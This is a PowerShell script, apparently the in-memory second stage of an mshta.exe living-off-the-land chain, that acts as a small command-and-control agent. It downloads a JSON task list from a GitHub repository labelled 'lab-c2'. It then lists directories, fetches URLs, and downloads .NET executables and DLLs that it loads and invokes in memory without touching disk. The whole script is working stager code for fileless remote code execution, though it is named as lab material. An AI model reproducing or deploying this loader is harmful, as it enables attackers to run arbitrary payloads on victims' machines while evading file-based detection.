# Child PowerShell script executed in-memory via mshta.exe
Write-Host "PowerShell Launched via mshta.exe > Inline JS > PowerShell" -ForegroundColor Green

# Log parent process ID
try {
    $parentPid = (Get-CimInstance Win32_Process -Filter "ProcessId=$PID").ParentProcessId
    Write-Host "Child started. PID=$PID Parent=$parentPid" -ForegroundColor Green
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}

# Download JSON playbook from the new short URL
$taskUrl = "https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/task.json"
Write-Host "Download: $taskUrl" -ForegroundColor Cyan
try {
    $raw = (New-Object System.Net.WebClient).DownloadString($taskUrl)
    $len = $raw.Length
    Write-Host "Download OK. Bytes=$len" -ForegroundColor Green
} catch {
    Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
    exit
}

# Parse JSON
try {
    $job = $raw | ConvertFrom-Json -ErrorAction Stop
    Write-Host "Parsed JSON id: $($job.id)" -ForegroundColor Green
} catch {
    Write-Host "JSON parse failed: $($_.Exception.Message)" -ForegroundColor Red
    exit
}

# Process tasks
$allowed = @('print', 'list_dir', 'fetch_info', 'run_exe', 'run_dll')
foreach ($t in $job.tasks) {
    $act = ("" + $t.action).ToLower()
    if ($allowed -notcontains $act) {
        Write-Host "Skip unallowed: $act" -ForegroundColor Yellow
        continue
    }
    switch ($act) {
        'print' {
            $msg = $t.message -as [string]
            Write-Host "PRINT: $msg" -ForegroundColor White
        }
        'list_dir' {
            $path = $t.path -as [string]
            try {
                $items = Get-ChildItem -Path $path -ErrorAction Stop
                Write-Host "LIST_DIR: $path ($($items.Count) items)" -ForegroundColor White
                foreach ($item in $items) {
                    Write-Host " - $($item.Mode) $($item.Length) $($item.Name)" -ForegroundColor White
                }
            } catch {
                Write-Host "LIST_DIR error: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        'fetch_info' {
            $url = $t.url -as [string]
            if ($url -eq "https://raw.githubusercontent.com/your-org/lab-files/main/sample.txt") {
                $url = "https://raw.githubusercontent.com/shateel/lotl-mshta/refs/heads/main/task.json"
                Write-Host "FETCH_INFO: Replaced URL with $url" -ForegroundColor Yellow
            }
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Encoding = [System.Text.Encoding]::UTF8
                $data = $wc.DownloadString($url)
                $len = $data.Length
                Write-Host "FETCH_INFO: $url len=$len" -ForegroundColor White
            } catch {
                Write-Host "FETCH_INFO error: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        'run_exe' {
            $url = $t.url -as [string]
            try {
                $wc = New-Object System.Net.WebClient
                $bytes = $wc.DownloadData($url)
                $len = $bytes.Length
                Write-Host "RUN_EXE: Downloaded $len bytes from $url" -ForegroundColor Yellow
                $assembly = [Reflection.Assembly]::Load($bytes)
                $entryPoint = $assembly.EntryPoint
                if ($entryPoint) {
                    Write-Host "RUN_EXE: Invoking entry point..." -ForegroundColor Cyan
                    $entryPoint.Invoke($null, @($null))
                    Write-Host "RUN_EXE: Execution complete." -ForegroundColor Green
                } else {
                    Write-Host "RUN_EXE error: No entry point found." -ForegroundColor Red
                }
            } catch {
                Write-Host "RUN_EXE error: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        'run_dll' {
            $url = $t.url -as [string]
            $className = $t.class -as [string]
            $methodName = $t.method -as [string]
            $args = $t.args -as [string[]]
            try {
                $wc = New-Object System.Net.WebClient
                $bytes = $wc.DownloadData($url)
                $len = $bytes.Length
                Write-Host "RUN_DLL: Downloaded $len bytes from $url" -ForegroundColor Yellow
                $assembly = [Reflection.Assembly]::Load($bytes)
                $type = $assembly.GetType($className)
                if ($type) {
                    $method = $type.GetMethod($methodName, [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static)
                    if ($method) {
                        Write-Host "RUN_DLL: Invoking $className.$methodName..." -ForegroundColor Cyan
                        $method.Invoke($null, @($args))
                        Write-Host "RUN_DLL: Execution complete." -ForegroundColor Green
                    } else {
                        Write-Host "RUN_DLL error: Method $methodName not found." -ForegroundColor Red
                    }
                } else {
                    Write-Host "RUN_DLL error: Class $className not found." -ForegroundColor Red
                }
            } catch {
                Write-Host "RUN_DLL error: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }
}

Write-Host "Child finished." -ForegroundColor Green
